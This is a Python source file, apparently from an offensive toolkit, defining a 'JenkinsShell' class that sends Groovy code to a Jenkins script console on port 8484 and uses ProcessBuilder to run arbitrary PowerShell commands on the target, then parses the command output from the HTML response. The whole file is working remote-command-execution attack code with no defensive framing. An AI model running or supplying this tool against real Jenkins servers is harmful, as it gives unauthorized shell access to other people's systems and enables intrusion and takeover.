import requests
from shells.shell import Shell
from bs4 import BeautifulSoup

class JenkinsShell(Shell):
    '''Class to interact with the Jenkins server like a shell'''

    def __init__(self, target: str, os: str):
        self.url = f'http://{target}:8484/script'
        super().__init__(target, os)

    def cmd(self, cmd: str, print_r = False) -> bool:
        '''Run a command in the shell'''
        try:
            # Send payload with command
            r = requests.post(self.url, 
                {
                    'script': f'println new ProcessBuilder("powershell.exe", "{cmd}").redirectErrorStream(true).start().text',
                    'Submit': 'Run'
                }
            )
        except requests.exceptions.ConnectionError:
            self.error(self.target, 'Connection error')
            return False

        # If print response is true, find the output in the resulting html and print it
        if print_r:
            soup = BeautifulSoup(r.text, 'html.parser')

            # Find the <h2> tag with the text "Result"
            h2_tag = soup.find('h2', text='Result')

            # Find the <pre> tag that immediately follows the <h2> tag
            if h2_tag:
                pre_tag = h2_tag.find_next_sibling('pre')
                if pre_tag:
                    t = pre_tag.text.replace('\r\n', '\n').strip('\n ')
                    self.print_output(t)
                else:
                    self.error(self.target, "Couldn't find command output.")
            else:
                self.error(self.target, "Couldn't find command output.")
        
        return True
    
    def kill(self):
        '''Close the shell'''
        pass